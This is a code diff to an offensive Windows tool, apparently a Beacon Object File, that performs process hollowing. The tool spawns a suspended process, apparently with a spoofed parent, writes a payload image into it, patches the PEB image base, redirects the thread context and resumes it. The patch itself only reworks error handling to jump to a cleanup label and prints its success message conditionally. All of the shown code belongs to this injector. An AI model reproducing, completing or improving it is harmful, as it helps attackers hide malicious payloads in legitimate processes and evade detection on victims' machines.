@@ -77,13 +77,13 @@ void go( char* args, int argc )
         ) ) == NULL ) 
         {
             ERR( "HeapAlloc" );
-            return;
+            goto cleanup;
         }
 
         if ( !Kernel32$InitializeProcThreadAttributeList( ThreadAttrList, 1, 0, &AttrListSize ) )
         {
             ERR( "InitializeProcThreadAttributeList" );
-            return;
+            goto cleanup;
         }
 
         if ( !Kernel32$UpdateProcThreadAttribute( 
@@ -97,7 +97,7 @@ void go( char* args, int argc )
             ) 
         ) {
             ERR( "UpdateProcThreadAttribute" );
-            return;
+            goto cleanup;
         }
 
         SiEx.lpAttributeList = ThreadAttrList;
@@ -105,7 +105,7 @@ void go( char* args, int argc )
         if ( !Kernel32$CreateProcessA( 0, PathToHollow, 0, 0, 0, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, 0, "C:\\Windows\\System32", &SiEx.StartupInfo, &Pi ) ) 
         {
             ERR( "CreateProcessA" );
-            return;
+            goto cleanup;
         }
     } 
     else 
@@ -134,7 +134,7 @@ void go( char* args, int argc )
     ) != 0x0 ) 
     {
         NTERR( "NtAllocateVirtualMemory", Status );
-        return;
+        goto cleanup;
     }
     DBG( "Allocated buffer at 0x%p in %d", RemoteMemory, Pi.dwProcessId );
 
@@ -143,10 +143,7 @@ void go( char* args, int argc )
     */
     if ( RemoteMemory != ( void* )NtHeaders->OptionalHeader.ImageBase )
     {
-        RegionSize = 0;
-        Ntdll$NtFreeVirtualMemory( Pi.hProcess, &RemoteMemory, &RegionSize, MEM_RELEASE );
-        MSG( "Memory was not allocated at correct address. Quitting.");
-        return;
+        goto cleanup;
     }
 
     /*
@@ -162,7 +159,7 @@ void go( char* args, int argc )
     ) != 0x0 || BytesWritten != NtHeaders->OptionalHeader.SizeOfHeaders )
     {
         NTERR( "NtWriteVirtualMemory", Status );
-        return;
+        goto cleanup;
     } 
     
     Section = IMAGE_FIRST_SECTION( NtHeaders );
@@ -178,7 +175,7 @@ void go( char* args, int argc )
         ) != 0x0 )
         {
             NTERR( "NtWriteVirtualMemory", Status );
-            return;
+            goto cleanup;
         }
     } 
 
@@ -190,7 +187,7 @@ void go( char* args, int argc )
     if ( ( Status = Ntdll$NtGetContextThread( Pi.hThread, &Ctx ) ) != 0x0 )
     {
         NTERR( "NtGetContextThread", Status );
-        return;
+        goto cleanup;
     }
 
     if ( ( Status = Ntdll$NtWriteVirtualMemory(
@@ -203,7 +200,7 @@ void go( char* args, int argc )
     ) != 0x0 )
     {
         NTERR("NtWriteVirtualMemory", Status );
-        return;
+        goto cleanup;
     }
     DBG( "Updated PEB->ImageBaseAddress to 0x%p. [Rdx 0x%p]", RemoteMemory, Ctx.Rdx );
 
@@ -249,7 +246,7 @@ void go( char* args, int argc )
         ) ) != 0x0 )
         {
             NTERR( "NtProtectVirtualMemory", Status );
-            return;
+            goto cleanup;
         }
     }
     DBG( "Applied memory permissions" );
@@ -261,7 +258,7 @@ void go( char* args, int argc )
     if ( ( Status = Ntdll$NtSetContextThread( Pi.hThread, &Ctx ) ) != 0x0 )
     {
         NTERR( "NtSetThreadContext", Status );
-        return;
+        goto cleanup;
     }
     
     /*
@@ -270,7 +267,7 @@ void go( char* args, int argc )
     if ( ( Status = Ntdll$NtResumeThread( Pi.hThread, 0 ) ) != 0x0 )
     {
         NTERR( "NtResumeThread", Status );
-        return;
+        goto cleanup;
     }
 
     Failed = 0;
@@ -290,6 +287,8 @@ cleanup:
         Kernel32$HeapFree( Kernel32$GetProcessHeap(), 0, ThreadAttrList );
     }
 
-    MSG( "[+] Spawned new %s [%d] process and injected payload via process hollowing [%d bytes]", PathToHollow, Pi.dwProcessId, PayloadSize );
+    if ( !Failed )
+        MSG( "[+] Spawned new %s [%d] process and injected payload via process hollowing [%d bytes]", PathToHollow, Pi.dwProcessId, PayloadSize );
+
     return;
 }
